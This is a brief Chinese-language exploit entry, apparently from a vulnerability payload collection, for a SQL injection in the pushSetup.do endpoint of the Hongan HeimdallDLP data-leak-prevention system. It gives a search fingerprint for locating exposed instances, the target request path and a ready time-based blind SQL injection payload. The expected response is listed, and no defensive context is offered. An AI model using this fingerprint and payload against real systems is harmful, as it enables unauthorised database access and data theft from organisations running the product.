# 虹安HeimdallDLP数据泄漏防护系统pushSetup.doSQL注入漏洞

虹安HeimdallDLP数据泄漏防护系统pushSetup.do ｜ SQL注入 ｜ —
- **指纹**：`body="userReg/initUserReg.do"`
- **请求**：`POST /dlp/userReg/pushSetup.do HTTP/1.1`

**Payload**
```
setupName={{urlescape(1' AND (SELECT 6789 FROM (SELECT(SLEEP(5)))nxdq) AND 'vpUG'='vpUG)}}
```
- **响应特征**：200